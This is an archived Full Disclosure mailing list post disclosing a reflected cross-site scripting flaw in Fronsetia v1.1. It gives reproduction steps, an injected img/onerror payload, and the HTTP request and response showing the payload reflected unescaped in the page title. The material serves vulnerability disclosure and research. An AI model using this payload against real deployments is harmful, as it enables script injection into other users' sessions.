---
title: Reflected XSS - fronsetiav1.1
url: https://seclists.org/fulldisclosure/2024/Nov/10
source: Full Disclosure
date: 2024-11-22
fetch_date: 2025-10-06T19:22:55.640410
---

# Reflected XSS - fronsetiav1.1

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#10)
[![Next](/images/right-icon-16x16.png)](11)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#10)
[![Next](/images/right-icon-16x16.png)](11)

![](/shared/images/nst-icons.svg#search)

# Reflected XSS - fronsetiav1.1

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Thu, 21 Nov 2024 17:48:11 +0000

---

```
# Exploit Title: Reflected XSS - fronsetiav1.1
# Date: 11/2024
# Exploit Author: Andrey Stoykov
# Version: 1.1
# Tested on: Debian 12
# Blog:
https://msecureltd.blogspot.com/2024/11/friday-fun-pentest-series-14-reflected.html

Reflected XSS #1 - "show_operations.jsp"

Steps to Reproduce:

1. Visit main page of the application.
2. In the input field of "WSDL Location" enter the following payload "><img
src=x onerror=alert(1)>

// HTTP GET Request
GET
/fronsetia/show_operations.jsp?Fronsetia_WSDL=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
HTTP/1.1
Host: 192.168.78.128:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0)
Gecko/20100101 Firefox/133.0
[...]

// HTTP Response
HTTP/1.1 200
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 6360
Date: Wed, 20 Nov 2024 19:42:15 GMT
Keep-Alive: timeout=20
Connection: keep-alive

[...]
<title> Fronsetia: "><img src=x onerror=alert(1)> </title>
[...]
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](9)
[By Date](date.html#10)
[![Next](/images/right-icon-16x16.png)](11)

[![Previous](/images/left-icon-16x16.png)](9)
[By Thread](index.html#10)
[![Next](/images/right-icon-16x16.png)](11)

### Current thread:

* **Reflected XSS - fronsetiav1.1** *Andrey Stoykov (Nov 21)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")